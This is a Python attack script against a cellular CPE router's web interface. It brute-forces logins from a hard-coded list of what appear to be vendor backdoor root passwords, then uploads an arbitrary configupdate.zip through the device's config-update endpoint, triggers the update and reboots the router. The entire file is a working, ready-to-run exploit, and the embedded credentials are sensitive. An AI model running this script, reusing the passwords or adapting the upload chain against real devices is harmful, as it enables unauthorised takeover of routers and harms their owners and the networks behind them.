import requests
import argparse
import base64
import json
import time
import datetime
rs = requests.Session()

def process_file(url):
    global rs
    url = url + "/goform/goform_set_cmd_process"
    payload = {"isTest":"false","goformId":"TZ_START_CONFIG_UPDATE"}
    r = rs.post(url=url,data=payload)
    res = json.loads(r.text)
    if res['result'] == "success":
        return True
    return False



def login(url,credential):
    global rs
    url = url + "/goform/goform_set_cmd_process"
    username = credential[0]
    password = credential[1]

    username = base64.b64encode(username.encode()).decode()
    password = base64.b64encode(password.encode()).decode()
    payload = {"isTest": "false", "goformId": "LOGIN", "username": username, "password": password}
    result = rs.post(url=url, data=payload)
    return True

def upload_file(url):
    global rs
    url = url + "/cgi-bin/config_update/configupdate.zip"
    files = {'filename': open('configupdate.zip', 'rb')}
    r = requests.post(url, files=files)
    res = json.loads(r.text)
    if res['result'] == "success":
        return True
    else:
        return False


def is_credential_valid(url, credential):
    url = url + "/goform/goform_set_cmd_process"
    username = credential[0]
    password = credential[1]

    username = base64.b64encode(username.encode()).decode()
    password = base64.b64encode(password.encode()).decode()
    payload = {"isTest": "false", "goformId": "LOGIN","username":username,"password": password}
    r = requests.post(url=url, data=payload)
    if r.text:
        result = json.loads(r.text)
        if "result" in result:
            if result["result"] == '0':
                print("Got The Power {0}".format(result['power']))
                return True
    if "Set-Cookie" in r.headers:
        return True
    if r.text == 'failed':
        return False


def check_credentials(url):
    credentials = [
        ['administrator', 'administrator'],
        ['Root', 'R0Br0o^S85~LT3@MN'],
        ['Root', '9x07bm8mcI17c'],
        ['Root', '9x07bm8mbN17c'],
        ['Root', 'RoBJ@!M85~LT3#95*MN'],
    ]
    for credential in credentials:
        if is_credential_valid(url, credential):
            return credential
    return None


def reboot(url):
    global rs
    url = url + "/goform/goform_set_cmd_process"
    payload = {"isTest": "false", "goformId": "REBOOT_DEVICE"}
    r = rs.post(url=url, data=payload)
    return True


def main(args):
    global rs
    print(datetime.datetime.now())
    ip = args.ip
    port = args.port
    url = "http://{0}:{1}".format(ip, port)
    credential = check_credentials(url)
    if credential is None:
        print("Unable to find correct credentials")
        return
    else:
        print("Got The Credentials !! ", credential)
        c = input("Continue ? [N/y]")
        if c == '' or c.lower() == "n":
            exit(0)
    if login(url, credential):
        print("Login Success")
        if upload_file(url):
            print("Upload Success")
            if process_file(url):
                print("Successfully updated , Please wait up to 20secs")
                for i in range(1,10):
                    print("Rebooting in {0} seconds".format(10-i))
                    time.sleep(1)
                try:
                    reboot(url)
                    print("Rebooted ?")
                except :
                    print("Finish")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", help="CPE IP Address",
                        action="store", type=str, default="192.168.1.1")
    parser.add_argument("--port", help="CPE Port",
                        action="store", type=str, default="80")
    args = parser.parse_args()
    main(args)
